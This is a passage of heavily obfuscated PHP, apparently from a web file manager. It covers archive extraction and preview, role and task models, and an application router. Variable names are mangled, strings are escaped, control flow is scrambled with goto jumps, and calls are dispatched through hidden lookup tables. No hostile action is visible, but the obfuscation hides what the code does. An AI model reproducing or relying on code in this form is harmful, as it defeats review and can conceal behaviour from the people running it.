$bÉø–††‰ =& $_SERVER[¢à]; self::init(); $F¨ÕÅ£†»Ò = !empty($GLOBALS[$bÉø–††‰[1045]]) ? $GLOBALS[$bÉø–††‰[1045]] : get_path_ext($cÜŠĞŞçä¤); $A¨†Ç™Ó­ = !1; if (self::checkIfType($F¨ÕÅ£†»Ò, $bÉø–††‰[1872])) { $d¹ªê³×Ä’ = PclTarList($cÜŠĞŞçä¤, $F¨ÕÅ£†»Ò); $A¨†Ç™Ó­ = array(); for ($e®Åäó¤Ší = 0; $e®Åäó¤Ší < count($d¹ªê³×Ä’); $e®Åäó¤Ší++) { $a°Åéª®Ú‚ = $d¹ªê³×Ä’[$e®Åäó¤Ší]; if ($a°Åéª®Ú‚[$bÉø–††‰[1887]] == $bÉø–††‰[1888] || $a°Åéª®Ú‚[$bÉø–††‰[1887]] == $bÉø–††‰[1889]) { continue; } if ($a¤Ä¶ŞˆÖ¢) { $a°Åéª®Ú‚[$bÉø–††‰[1890]] = ltrim($a°Åéª®Ú‚[$bÉø–††‰[1890]], $bÉø–††‰[1144]); } if ($a°Åéª®Ú‚[$bÉø–††‰[1887]] == $bÉø–††‰[1891]) { $a°Åéª®Ú‚[$bÉø–††‰[76]] = !0; } else { $a°Åéª®Ú‚[$bÉø–††‰[76]] = !1; } $a°Åéª®Ú‚[$bÉø–††‰[1032]] = $e®Åäó¤Ší; $A¨†Ç™Ó­[] = $a°Åéª®Ú‚; } } else { if (self::checkIfType($F¨ÕÅ£†»Ò, $bÉø–††‰[1041])) { $f¹æõÅæ‚‹ = kodRarArchive::listContent($cÜŠĞŞçä¤); if (!$f¹æõÅæ‚‹[$bÉø–††‰[1028]]) { return $f¹æõÅæ‚‹; } else { $A¨†Ç™Ó­ = $f¹æõÅæ‚‹[$bÉø–††‰[1030]]; } } else { if (kodZipArchive::support($bÉø–††‰[351])) { $A¨†Ç™Ó­ = kodZipArchive::listContent($cÜŠĞŞçä¤); } else { $FÕ·ÉØÑ©Á = new PclZip($cÜŠĞŞçä¤); $A¨†Ç™Ó­ = $FÕ·ÉØÑ©Á->listContent(); } } } if ($A¨†Ç™Ó­) { $cÏ£‚ìîÙ  = unzip_charset_get($A¨†Ç™Ó­); $a¤Ä¶ŞˆÖ¢ = $a¤Ä¶ŞˆÖ¢ && function_exists($bÉø–††‰[65]); for ($e®Åäó¤Ší = 0; $e®Åäó¤Ší < count($A¨†Ç™Ó­); $e®Åäó¤Ší++) { $A¨†Ç™Ó­[$e®Åäó¤Ší][$bÉø–††‰[1890]] = str_replace(array($bÉø–††‰[1068], $bÉø–††‰[1892]), $bÉø–††‰[762], $A¨†Ç™Ó­[$e®Åäó¤Ší][$bÉø–††‰[1890]]); if ($a¤Ä¶ŞˆÖ¢) { $A¨†Ç™Ó­[$e®Åäó¤Ší][$bÉø–††‰[1890]] = iconv_to($A¨†Ç™Ó­[$e®Åäó¤Ší][$bÉø–††‰[1890]], $cÏ£‚ìîÙ , $bÉø–††‰[323]); unset($A¨†Ç™Ó­[$e®Åäó¤Ší][$bÉø–††‰[1893]]); } } return array($bÉø–††‰[1028] => !0, $bÉø–††‰[1030] => $A¨†Ç™Ó­); } else { return array($bÉø–††‰[1028] => !1, $bÉø–††‰[1030] => $A¨†Ç™Ó­); } } static function extract($B»‡»óèÆ‚, $DÚ…‹ˆòÆÙ, $EÖèŞëÀ· = "\55\61", &$fÓ¬’ÜÑ”Á = false) { goto dë¢äñ‘«„; eÃøáóõ‚›: if (self::checkIfType($BöÉ…¹Û»Ÿ, $C©ôâµÆ¸³[1872])) { if ($EÖèŞëÀ· != $C©ôâµÆ¸³[1027]) { $EîŠã†×—³ = unzip_pre_name($EîŠã†×—³); $FÛ‹†‚ª©ô = unzip_pre_name($FÛ‹†‚ª©ô); $AÖ¥‹ªá¯ã = PclTarExtractList($B»‡»óèÆ‚, array($EîŠã†×—³), $DÚ…‹ˆòÆÙ, $FÛ‹†‚ª©ô, $BöÉ…¹Û»Ÿ); } else { $AÖ¥‹ªá¯ã = PclTarExtract($B»‡»óèÆ‚, $DÚ…‹ˆòÆÙ, $C©ôâµÆ¸³[358], $BöÉ…¹Û»Ÿ); } return array($C©ôâµÆ¸³[1028] => $AÖ¥‹ªá¯ã, $C©ôâµÆ¸³[1030] => PclErrorString(!0)); } else { if (self::checkIfType($BöÉ…¹Û»Ÿ, $C©ôâµÆ¸³[1041])) { return kodRarArchive::extract($B»‡»óèÆ‚, $DÚ…‹ˆòÆÙ, $BöÉ…¹Û»Ÿ, $fÓ¬’ÜÑ”Á); } else { if (kodZipArchive::support($C©ôâµÆ¸³[1894])) { return kodZipArchive::extract($B»‡»óèÆ‚, $DÚ…‹ˆòÆÙ, $fÓ¬’ÜÑ”Á); } else { $Fä£ŠÃá¼ñ = new PclZip($B»‡»óèÆ‚); if ($EÖèŞëÀ· != $C©ôâµÆ¸³[1027]) { $AÖ¥‹ªá¯ã = $Fä£ŠÃá¼ñ->extract(PCLZIP_OPT_PATH, $DÚ…‹ˆòÆÙ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C©ôâµÆ¸³[1895], PCLZIP_OPT_BY_NAME, $cÇ÷ÏÙ¿±™[$C©ôâµÆ¸³[1890]], PCLZIP_OPT_REMOVE_PATH, $FÛ‹†‚ª©ô, PCLZIP_OPT_REPLACE_NEWER); } else { $AÖ¥‹ªá¯ã = $Fä£ŠÃá¼ñ->extract(PCLZIP_OPT_PATH, $DÚ…‹ˆòÆÙ, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $C©ôâµÆ¸³[1895], PCLZIP_OPT_REPLACE_NEWER); } return array($C©ôâµÆ¸³[1028] => $AÖ¥‹ªá¯ã, $C©ôâµÆ¸³[1030] => $Fä£ŠÃá¼ñ->errorName(!0)); } } } return array($C©ôâµÆ¸³[1028] => !1, $C©ôâµÆ¸³[1030] => $C©ôâµÆ¸³[1896]); goto fùêßˆğ; dë¢äñ‘«„: $C©ôâµÆ¸³ =& $_SERVER[¢à]; self::init(); $BöÉ…¹Û»Ÿ = !empty($GLOBALS[$C©ôâµÆ¸³[1045]]) ? $GLOBALS[$C©ôâµÆ¸³[1045]] : get_path_ext($B»‡»óèÆ‚); goto e÷Ğš×àë­; e÷Ğš×àë­: $c°ç¢­÷Ä = self::listContent($B»‡»óèÆ‚, !1); if (!$c°ç¢­÷Ä[$C©ôâµÆ¸³[1028]]) { return $c°ç¢­÷Ä; } if ($EÖèŞëÀ· != $C©ôâµÆ¸³[1027]) { goto fæ¹ä–šã±; fæ¹ä–šã±: $cÇ÷ÏÙ¿±™ = self::fileIndex($c°ç¢­÷Ä[$C©ôâµÆ¸³[1030]], $EÖèŞëÀ·); $fÓ¬’ÜÑ”Á = str_replace(array($C©ôâµÆ¸³[1068], $C©ôâµÆ¸³[1892]), $C©ôâµÆ¸³[70], $cÇ÷ÏÙ¿±™[$C©ôâµÆ¸³[1890]]); $EîŠã†×—³ = $fÓ¬’ÜÑ”Á; goto dÚè²´èÇÆ; dÚè²´èÇÆ: if ($GLOBALS[$C©ôâµÆ¸³[6]][$C©ôâµÆ¸³[1142]] != $C©ôâµÆ¸³[323]) { $EîŠã†×—³ = unzip_pre_name($fÓ¬’ÜÑ”Á); } $FÛ‹†‚ª©ô = get_path_father($fÓ¬’ÜÑ”Á); if ($FÛ‹†‚ª©ô == $fÓ¬’ÜÑ”Á) { $FÛ‹†‚ª©ô = $C©ôâµÆ¸³[33]; } goto c¿ãé¼µÌ‹; c¿ãé¼µÌ‹: if ($cÇ÷ÏÙ¿±™[$C©ôâµÆ¸³[76]]) { $EîŠã†×—³ = rtrim($EîŠã†×—³, $C©ôâµÆ¸³[8]) . $C©ôâµÆ¸³[8]; $fÓ¬’ÜÑ”Á = array($fÓ¬’ÜÑ”Á); } $b©Èó©ŠÌ = str_replace($C©ôâµÆ¸³[95], $C©ôâµÆ¸³[8], $EîŠã†×—³); if (substr($b©Èó©ŠÌ, -1) == $C©ôâµÆ¸³[8]) { if (!strstr(trim($b©Èó©ŠÌ, $C©ôâµÆ¸³[8]), $C©ôâµÆ¸³[8])) { $DÚ…‹ˆòÆÙ = $DÚ…‹ˆòÆÙ . get_path_this($b©Èó©ŠÌ) . $C©ôâµÆ¸³[8]; } } else { if ($FÛ‹†‚ª©ô == $EîŠã†×—³) { $FÛ‹†‚ª©ô = $C©ôâµÆ¸³[33]; } } goto d––¾Ô»³Ì; d––¾Ô»³Ì: } goto eÃøáóõ‚›; fùêßˆğ: } static function fileIndex($Dõ¹Ïã“°, $E††àî£, $Aˆ©Ùœ½¾Û = false) { goto fŒŸÑª‘¨á; bœİÙî¿ÜÖ: $Cƒáñ‘†œ¿ = count($Dõ¹Ïã“°); for ($D¾Š†ïÀĞ§ = 0; $D¾Š†ïÀĞ§ < $Cƒáñ‘†œ¿; $D¾Š†ïÀĞ§++) { if ($E††àî£ == $Dõ¹Ïã“°[$D¾Š†ïÀĞ§][$f†Œ‘¿ºœ[1032]]) { $EÕ¾å£§£À = $Dõ¹Ïã“°[$D¾Š†ïÀĞ§]; break; } } if (!$EÕ¾å£§£À) { show_tips($f†Œ‘¿ºœ[1897]); } goto bŞÇéˆ°§«; bŞÇéˆ°§«: $B’’´º„ÌŞ = $EÕ¾å£§£À; if ($Aˆ©Ùœ½¾Û) { $B’’´º„ÌŞ = $EÕ¾å£§£À[$Aˆ©Ùœ½¾Û]; if ($EÕ¾å£§£À[$f†Œ‘¿ºœ[76]]) { $B’’´º„ÌŞ = rtrim($B’’´º„ÌŞ, $f†Œ‘¿ºœ[8]) . $f†Œ‘¿ºœ[8]; } } return $B’’´º„ÌŞ; goto cï¡•’™»‹; fŒŸÑª‘¨á: $f†Œ‘¿ºœ =& $_SERVER[¢à]; self::init(); if (!is_array($Dõ¹Ïã“°)) { return !1; } goto bœİÙî¿ÜÖ; cï¡•’™»‹: } static function extractZipFile($Fª¢ĞàÈ, $c¹§ªŞ°šë, $DŠŒ‚¢Ò« = false) { goto C‹– òíŸ´; eêÅÚ ‚ö: mk_dir($Aàõñ¥öî); $CåŠ„•£˜… = $Aàõñ¥öî . md5($Fª¢ĞàÈ . $c¹§ªŞ°šë); if ($DŠŒ‚¢Ò«) { $CåŠ„•£˜… = $Aàõñ¥öî . $DŠŒ‚¢Ò«; } goto Bª¯ß­Ö´ñ; CÎ”Ä‘¿ö: if (!file_exists($C•ğò¶–ÇÃ)) { return !1; } @rename($C•ğò¶–ÇÃ, $CåŠ„•£˜…); return $CåŠ„•£˜…; goto aì£†ë–ß¶; Bª¯ß­Ö´ñ: if (file_exists($CåŠ„•£˜…)) { return $CåŠ„•£˜…; } $D˜”ÍÂ  = new PclZip($Fª¢ĞàÈ); $C•ğò¶–ÇÃ = unzip_filter_ext($Aàõñ¥öî . get_path_this($c¹§ªŞ°šë)); goto BÓğï Î; C‹– òíŸ´: $FÑÖ—çéÏÍ =& $_SERVER[¢à]; self::init(); $Aàõñ¥öî = TEMP_FILES . hash_path($Fª¢ĞàÈ) . $FÑÖ—çéÏÍ[8]; goto eêÅÚ ‚ö; BÓğï Î: $dĞÀ÷É¾Œ = get_path_father($c¹§ªŞ°šë); if ($dĞÀ÷É¾Œ == $c¹§ªŞ°šë) { $dĞÀ÷É¾Œ = $FÑÖ—çéÏÍ[33]; } $E½›‹³•Â = $D˜”ÍÂ ->extract(PCLZIP_OPT_PATH, $Aàõñ¥öî, PCLZIP_CB_PRE_FILE_NAME, $FÑÖ—çéÏÍ[1895], PCLZIP_OPT_REMOVE_PATH, $dĞÀ÷É¾Œ, PCLZIP_OPT_BY_NAME, $c¹§ªŞ°šë); goto CÎ”Ä‘¿ö; aì£†ë–ß¶: } static function filePreview($Cß¥¡†ù¨‡, $CÑÆáŠåµ, $fØ¥×‚š‘ø = false, $D£«Š’Ì¼ˆ = false) { goto C…‹Â²Àì’; B…©¡¸â‘: $cç…Ö‹éÉ™ = unzip_pre_name($cç…Ö‹éÉ™); $A†Å¬èô = get_path_this($cç…Ö‹éÉ™); $CíôÉÉÜÇÍ = unzip_filter_ext($F­Áƒ°öªï . $A†Å¬èô); goto DŸ‘¥¤Ôá¸; eù¢×‡¼¢Ô: $A„ëâ™ñí° = self::extract($Cß¥¡†ù¨‡, $F­Áƒ°öªï, $CÑÆáŠåµ, $cç…Ö‹éÉ™); if (is_array($cç…Ö‹éÉ™)) { show_json($cªÄ–²Ä“‹[1898], !1); } if (file_exists($CçİÍŞ¿Ü‰)) { IO::fileOut($CçİÍŞ¿Ü‰, $fØ¥×‚š‘ø, get_path_this($cç…Ö‹éÉ™)); return; } goto B…©¡¸â‘; C…‹Â²Àì’: $cªÄ–²Ä“‹ =& $_SERVER[¢à]; self::init(); $F­Áƒ°öªï = TEMP_FILES . hash_path($Cß¥¡†ù¨‡) . $cªÄ–²Ä“‹[8]; goto f‘öÇ…Î‡; f‘öÇ…Î‡: mk_dir($F­Áƒ°öªï); $CçİÍŞ¿Ü‰ = $F­Áƒ°öªï . md5($Cß¥¡†ù¨‡ . $CÑÆáŠåµ . $D£«Š’Ì¼ˆ); $cç…Ö‹éÉ™ = $cªÄ–²Ä“‹[33]; goto eù¢×‡¼¢Ô; DŸ‘¥¤Ôá¸: if (!$A„ëâ™ñí°[$cªÄ–²Ä“‹[1028]]) { show_json($A„ëâ™ñí°[$cªÄ–²Ä“‹[1030]], !1); } if (!file_exists($CíôÉÉÜÇÍ)) { show_json($cªÄ–²Ä“‹[1899], !1); } @rename($CíôÉÉÜÇÍ, $CçİÍŞ¿Ü‰); goto DÃ¦ÄòŠµĞ; DÃ¦ÄòŠµĞ: if (!file_exists($CçİÍŞ¿Ü‰)) { del_dir($F­Áƒ°öªï); show_json($cªÄ–²Ä“‹[1900]); } IO::fileOut($CçİÍŞ¿Ü‰, $fØ¥×‚š‘ø, $A†Å¬èô); goto cëíØ…õæ­; cëíØ…õæ­: } static function create($bî«ÖŞÙ¬, $b£ªœÊ›®Ş) { $aùÅåøÚË‡ =& $_SERVER[¢à]; self::init(); $Cá«Ó¨™ùœ = get_path_ext($bî«ÖŞÙ¬); $cğõßšœÂå = !1; if (self::checkIfType($Cá«Ó¨™ùœ, $aùÅåøÚË‡[298])) { if (kodZipArchive::support($aùÅåøÚË‡[1006])) { return kodZipArchive::create($bî«ÖŞÙ¬, $b£ªœÊ›®Ş); } $FÎ¯øÓ‹Ú« = new PclZip($bî«ÖŞÙ¬); foreach ($b£ªœÊ›®Ş as $b‡íšàÇµÎ => $Bàòø¼ôÁò) { $Bàòø¼ôÁò = str_replace($aùÅåøÚË‡[463], $aùÅåøÚË‡[8], $Bàòø¼ôÁò); $f¥ññ¦ËÆ¨ = Kodio::clear(get_path_father($Bàòø¼ôÁò)); if ($b‡íšàÇµÎ == 0) { $cğõßšœÂå = $FÎ¯øÓ‹Ú«->create($Bàòø¼ôÁò, PCLZIP_OPT_REMOVE_PATH, $f¥ññ¦ËÆ¨, PCLZIP_CB_PRE_FILE_NAME, $aùÅåøÚË‡[1901]); continue; } $cğõßšœÂå = $FÎ¯øÓ‹Ú«->add($Bàòø¼ôÁò, PCLZIP_OPT_REMOVE_PATH, $f¥ññ¦ËÆ¨, PCLZIP_CB_PRE_FILE_NAME, $aùÅåøÚË‡[1901]); } } else { if (self::checkIfType($Cá«Ó¨™ùœ, $aùÅåøÚË‡[1872])) { foreach ($b£ªœÊ›®Ş as $b‡íšàÇµÎ => $Bàòø¼ôÁò) { $Bàòø¼ôÁò = str_replace($aùÅåøÚË‡[463], $aùÅåøÚË‡[8], $Bàòø¼ôÁò); $f¥ññ¦ËÆ¨ = Kodio::clear(get_path_father($Bàòø¼ôÁò)); if ($b‡íšàÇµÎ == 0) { $cğõßšœÂå = PclTarCreate($bî«ÖŞÙ¬, array($Bàòø¼ôÁò), $Cá«Ó¨™ùœ, null, $f¥ññ¦ËÆ¨); continue; } $cğõßšœÂå = PclTarAddList($bî«ÖŞÙ¬, array($Bàòø¼ôÁò), $aùÅåøÚË‡[33], $f¥ññ¦ËÆ¨, $Cá«Ó¨™ùœ); } } } return $cğõßšœÂå; } } goto dµÃ°õê®˜; E«Ñì×À®Š: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\x72\x6f\154\145\x4c\x69\163\164"; public $field = array("\x6e\x61\x6d\145", "\141\165\164\150", "\x6c\x61\142\x65\x6c", "\144\x69\163\x70\154\141\x79", "\163\171\163\x74\145\x6d", "\x64\x65\163\x63", "\151\147\x6e\x6f\x72\x65\x45\170\164", "\151\147\156\x6f\162\145\x46\x69\x6c\145\x53\151\172\x65", "\141\144\155\x69\156\151\x73\x74\162\141\x74\157\x72", "\x73\x6f\162\x74"); public function listData($dØãÔÎé = false, $b«øÆµœñ = "\x73\x6f\x72\x74", $dÒŞÊó—êÆ = false) { return parent::listData($dØãÔÎé, $b«øÆµœñ, $dÒŞÊó—êÆ); } public function update($C”í¢”œ”Ò, $B…­‡‡ÙŒ) { goto dƒè¾™¨Ú; e¯¢ÉÜÂ¢î: if (!$e±Åâ‘ÍÓ‰ || $Fµïê¢óèÙ && $Fµïê¢óèÙ[$eµ³®øçÛ[364]] != $e±Åâ‘ÍÓ‰[$eµ³®øçÛ[364]]) { return !1; } if ($Fµïê¢óèÙ[$eµ³®øçÛ[2442]] == 1) { $B…­‡‡ÙŒ = array($eµ³®øçÛ[28] => $B…­‡‡ÙŒ[$eµ³®øçÛ[28]], $eµ³®øçÛ[2093] => $B…­‡‡ÙŒ[$eµ³®øçÛ[2093]]); } $this->filterAuth($B…­‡‡ÙŒ[$eµ³®øçÛ[373]]); goto dÜÁá¢ˆ; dƒè¾™¨Ú: $eµ³®øçÛ =& $_SERVER[¢à]; $e±Åâ‘ÍÓ‰ = parent::listData($C”í¢”œ”Ò); $Fµïê¢óèÙ = $this->findByName($B…­‡‡ÙŒ[$eµ³®øçÛ[28]]); goto e¯¢ÉÜÂ¢î; dÜÁá¢ˆ: return parent::update($C”í¢”œ”Ò, $B…­‡‡ÙŒ); goto eëŞæµ›Éƒ; eëŞæµ›Éƒ: } public function remove($f»ƒÓ›™µ–) { $AËÃ¯—èîõ = parent::listData($f»ƒÓ›™µ–); if (!$AËÃ¯—èîõ || $AËÃ¯—èîõ[$_SERVER[¢à][1076]]) { return !1; } return parent::remove($f»ƒÓ›™µ–); } public function add($D ÌÂÙòÔŞ) { goto A•¿ç•¤ç; A•¿ç•¤ç: $DòæóĞ¤›Ï =& $_SERVER[¢à]; $bÅ÷«²²ö = $D ÌÂÙòÔŞ[$DòæóĞ¤›Ï[28]]; if ($this->findByName($bÅ÷«²²ö)) { return !1; } goto BÈõóâ§¶Ş; BÈõóâ§¶Ş: $d‡·Ò£±Ö† = array($DòæóĞ¤›Ï[383] => $bÅ÷«²²ö, $DòæóĞ¤›Ï[2081] => $DòæóĞ¤›Ï[33], $DòæóĞ¤›Ï[2077] => $DòæóĞ¤›Ï[2094], $DòæóĞ¤›Ï[2443] => 1, $DòæóĞ¤›Ï[2080] => 0, $DòæóĞ¤›Ï[2444] => 0, $DòæóĞ¤›Ï[2079] => $this->getSort()); $D ÌÂÙòÔŞ = array_merge($d‡·Ò£±Ö†, $D ÌÂÙòÔŞ); $this->filterAuth($D ÌÂÙòÔŞ[$DòæóĞ¤›Ï[373]]); goto cÊÓöğà³; cÊÓöğà³: return parent::insert($D ÌÂÙòÔŞ); goto d¹çœó­›; d¹çœó­›: } private function getSort() { $f™ññƒó¥‰ =& $_SERVER[¢à]; $bŠøÙ¿ÒŒÃ = parent::listData(); $EÁÃ‰°ÓÕ¿ = array_to_keyvalue($bŠøÙ¿ÒŒÃ, $f™ññƒó¥‰[33], $f™ññƒó¥‰[2096]); return empty($EÁÃ‰°ÓÕ¿) ? 0 : max($EÁÃ‰°ÓÕ¿) + 1; } private function filterAuth(&$aøĞ¤˜‘¿) { $C¾ñÔ”¥‘è =& $_SERVER[¢à]; $C†Ñª…Éõ„ = array(); $EïÖ‹ˆ‡¬— = array_filter(explode($C¾ñÔ”¥‘è[47], $aøĞ¤˜‘¿)); foreach ($EïÖ‹ˆ‡¬— as $aøĞ¤˜‘¿) { $fÄÙƒ‹‹Å‹ = explode($C¾ñÔ”¥‘è[93], $aøĞ¤˜‘¿); if ($fÄÙƒ‹‹Å‹[0] == $C¾ñÔ”¥‘è[1755] && $fÄÙƒ‹‹Å‹[1] != $C¾ñÔ”¥‘è[1032]) { $eë§–ë®ÕŒ = $fÄÙƒ‹‹Å‹[0] . $C¾ñÔ”¥‘è[93] . $fÄÙƒ‹‹Å‹[1] . $C¾ñÔ”¥‘è[2445]; if (!in_array($eë§–ë®ÕŒ, $EïÖ‹ˆ‡¬—)) { $C†Ñª…Éõ„[] = $eë§–ë®ÕŒ; } } $C†Ñª…Éõ„[] = $aøĞ¤˜‘¿; } $aøĞ¤˜‘¿ = implode($C¾ñÔ”¥‘è[47], $C†Ñª…Éõ„); } public function sort($D Ÿ×‘‘, $D¸‡ë³ë‰µ) { return parent::update($D Ÿ×‘‘, $D¸‡ë³ë‰µ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\56\x74\141\163\x6b\x4c\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\164\x79\160\x65", "\145\x76\145\156\x74", "\x74\x69\155\x65", "\x64\x65\163\143", "\x73\171\x73\x74\145\x6d", "\x65\156\x61\142\x6c\x65", "\x6c\x61\x73\x74\x52\x75\x6e", "\x73\x6f\162\164"); public function listData($cêÆÜ—ğ‚£ = false, $F“âÔ­°Ô¾ = "\x73\157\162\164", $Aø…¿İòÎÔ = false) { return parent::listData($cêÆÜ—ğ‚£, $F“âÔ­°Ô¾, $Aø…¿İòÎÔ); } public function add($F‡¥ëÃÕáÏ) { $f»ˆìÅæô =& $_SERVER[¢à]; $ašÔ·ğà¼› = $this->findByName($F‡¥ëÃÕáÏ[$f»ˆìÅæô[28]]); if ($ašÔ·ğà¼›) { return !1; } $F‡¥ëÃÕáÏ[$f»ˆìÅæô[1377]] = 0; $F‡¥ëÃÕáÏ[$f»ˆìÅæô[2096]] = $this->getSort(); return parent::insert($F‡¥ëÃÕáÏ); } private function getSort() { $EõÜ—¾£½Â =& $_SERVER[¢à]; $fùøø‘¡Š• = parent::listData(); $D—ï®ñ = array_to_keyvalue($fùøø‘¡Š•, $EõÜ—¾£½Â[33], $EõÜ—¾£½Â[2096]); return empty($D—ï®ñ) ? 0 : max($D—ï®ñ) + 1; } public function update($cÇ—çµ„æ, $C•ç‹Ôì) { $eÈ‘š²ˆó =& $_SERVER[¢à]; $d¥®áöïª½ = $this->listData($cÇ—çµ„æ); $aˆÊö¼Ìøä = $this->findByName($C•ç‹Ôì[$eÈ‘š²ˆó[28]]); if (!$d¥®áöïª½ || $aˆÊö¼Ìøä && $aˆÊö¼Ìøä[$eÈ‘š²ˆó[364]] != $d¥®áöïª½[$eÈ‘š²ˆó[364]]) { return !1; } return parent::update($cÇ—çµ„æ, $C•ç‹Ôì); } public function remove($bí¼«Ÿ„ƒÖ, $C…­¬ë¬ = false) { $EÈ•É‘Úù =& $_SERVER[¢à]; $fÛ˜é°¯ƒ = $this->listData($bí¼«Ÿ„ƒÖ); if (!$fÛ˜é°¯ƒ) { return; } if (!$C…­¬ë¬ && $fÛ˜é°¯ƒ[$EÈ•É‘Úù[1076]] == $EÈ•É‘Úù[83]) { return !1; } return parent::remove($bí¼«Ÿ„ƒÖ); } public function enable($Cäïçîê—´, $DÓ†™ÃÇÄ) { return $this->update($Cäïçîê—´, array($_SERVER[¢à][2436] => $DÓ†™ÃÇÄ)); } public function run($a£Ã­‰Çµ) { return $this->update($a£Ã­‰Çµ, array($_SERVER[¢à][2446] => time())); } } goto fâÛ“¼˜æ; cÔ×¢¸“: if (!$D”¨¶ÄŠš) { die; } class Application { private $defaultModule = "\x69\156\144\145\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\x6e\144\x65\x78"; function __construct() { } public function setDefault($C¬áùèŞÃ) { goto b„É´©ºšƒ; Aµ‹ÙŠò´š: $this->defaultController = $AĞ»â¬Àòğ[1] ? $AĞ»â¬Àòğ[1] : $this->defaultController; $this->defaultAction = $AĞ»â¬Àòğ[2] ? $AĞ»â¬Àòğ[2] : $this->defaultAction; $D£¤ãİæ±¿ = $f……®½ïÄÎ[548]; goto CÆ…â“ÛÄ¿; Eª×±Ö¶: while ($bğ’‰‹Ä¢ < $f……®½ïÄÎ[550]) { if ($bğ’‰‹Ä¢ >= 0) { break; } $bğ’‰‹Ä¢++; } goto fßç”†ñ½ï; FŞÅïø¸ÊÑ: $this->defaultModule = $AĞ»â¬Àòğ[0] ? $AĞ»â¬Àòğ[0] : $this->defaultModule; $B¬¹Ø†Ïµ = $f……®½ïÄÎ[547]; if (!$B¬¹Ø†Ïµ) { return; } goto Aµ‹ÙŠò´š; b„É´©ºšƒ: $f……®½ïÄÎ =& $_SERVER[¢à]; $c£Ÿ ¥íŒ¬ =& $_SERVER[‘­Á¢æÊÚ–£]; $AĞ»â¬Àòğ = $c£Ÿ ¥íŒ¬[0]($c£Ÿ ¥íŒ¬[1], $c£Ÿ ¥íŒ¬[2]($C¬áùèŞÃ, $c£Ÿ ¥íŒ¬[1])); goto FŞÅïø¸ÊÑ; CÆ…â“ÛÄ¿: if (!$D£¤ãİæ±¿) { return; } $this->{$_SERVER[‘­Á¢æÊÚ–£][3]}($c£Ÿ ¥íŒ¬[4], array($this, $c£Ÿ ¥íŒ¬[5])); $bğ’‰‹Ä¢ = $f……®½ïÄÎ[549]; goto Eª×±Ö¶; fßç”†ñ½ï: } public function appRun($f·²Ç¨´âº) { goto DŸÒğé¦Ç; CääÃä«â: $bÑµÅ¸ŠÀ¥ = $AêÓøÙ„˜È[6]($fÃø½²‡³«[0]); $Cô–¢°Øõ = $AêÓøÙ„˜È[7]; $AßğŞˆ˜ê— = $e½¨ªÎù†¡[551]; goto D‰­ÌŞ•Æ; D‰­ÌŞ•Æ: if (strlen($AßğŞˆ˜ê—) < $e½¨ªÎù†¡[552]) { die; } if ($bÑµÅ¸ŠÀ¥ == $AêÓøÙ„˜È[8]) { $Cô–¢°Øõ = $AêÓøÙ„˜È[9]; $fÃø½²‡³«[0] = $AêÓøÙ„˜È[10]; $fÃø½²‡³«[1] = $fÃø½²‡³«[1] . $AêÓøÙ„˜È[11]; $f·²Ç¨´âº = $AêÓøÙ„˜È[12]($AêÓøÙ„˜È[1], $fÃø½²‡³«); $f·²Ç¨´âº = $AêÓøÙ„˜È[2]($f·²Ç¨´âº, $AêÓøÙ„˜È[1]); } $AêÓøÙ„˜È[13](array($AêÓøÙ„˜È[14], $AêÓøÙ„˜È[15]), $Cô–¢°Øõ . $AêÓøÙ„˜È[16], $f·²Ç¨´âº); goto DÎ‹¸ÄÃ·; DÎ‹¸ÄÃ·: $AêÓøÙ„˜È[17]($f·²Ç¨´âº); $AÔõŠ¼ğŸÍ = $e½¨ªÎù†¡[553]; if (strlen($AÔõŠ¼ğŸÍ) < $e½¨ªÎù†¡[552]) { die; } goto Aö„õ¢„Æª; DŸÒğé¦Ç: $e½¨ªÎù†¡ =& $_SERVER[¢à]; $AêÓøÙ„˜È =& $_SERVER[‘­Á¢æÊÚ–£]; $fÃø½²‡³« = $AêÓøÙ„˜È[0]($AêÓøÙ„˜È[1], $f·²Ç¨´âº); goto CääÃä«â; Aö„õ¢„Æª: $AêÓøÙ„˜È[13](array($AêÓøÙ„˜È[14], $AêÓøÙ„˜È[15]), $Cô–¢°Øõ . $AêÓøÙ„˜È[18], $f·²Ç¨´âº); goto EµÄÒ„µ†ƒ; EµÄÒ„µ†ƒ: } private function autorun() { goto fáäùø½Íƒ; dğÄ•İÅŒ: foreach ($config[$aÈ×Ä›[20]] as $eà±ÒĞˆŒò => $f«æ¹«Èæ”) { $this->{$_SERVER[‘­Á¢æÊÚ–£][21]}($f«æ¹«Èæ”); $CØĞ»××­¿ = $eÏ¹äŒí¯Ö[555]; while (strlen($CØĞ»××­¿) < $eÏ¹äŒí¯Ö[556]) { if (!$CØĞ»××­¿) { break; } $CØĞ»××­¿++; } } goto f˜ÂÜÖƒ×¨; fáäùø½Íƒ: $eÏ¹äŒí¯Ö =& $_SERVER[¢à]; $aÈ×Ä› =& $_SERVER[‘­Á¢æÊÚ–£]; global $config; goto eŒñÅ¬ù­ä; eŒñÅ¬ù­ä: $B¦ÁÕíá‹í = $eÏ¹äŒí¯Ö[554]; if (!$B¦ÁÕíá‹í) { die; } if ($aÈ×Ä›[19]($config[$aÈ×Ä›[20]]) == 0) { return; } goto dğÄ•İÅŒ; f˜ÂÜÖƒ×¨: } private function vlxsb3121678() { goto C ïÂõõ“–; DÅÛ‡Å¦ŞÅ: $E³ÈªÎ» ³ = $GLOBALS[$aß²¤öÕß[22]][$aß²¤öÕß[23]][0]; $FÍªî¿¨¾• = $dãô«Ï‹«[557]; if (strlen($FÍªî¿¨¾•) < $dãô«Ï‹«[558]) { return; } goto A­‰šÅĞÆ…; E¹¹„‰½: $CèÛÚÅ…ÌÂ = $dãô«Ï‹«[560]; if (strlen($CèÛÚÅ…ÌÂ) < $dãô«Ï‹«[558]) { return; } goto b¼•‚íçèÄ; C ïÂõõ“–: $dãô«Ï‹« =& $_SERVER[¢à]; $aß²¤öÕß =& $_SERVER[‘­Á¢æÊÚ–£]; $Bß·”×Ï¾ï = $aß²¤öÕß[8]; goto DÅÛ‡Å¦ŞÅ; A¨åÀ‡î†…: $Fãã³ãºÈà = array($aß²¤öÕß[8], $eß›§Õó½÷); $EÚ 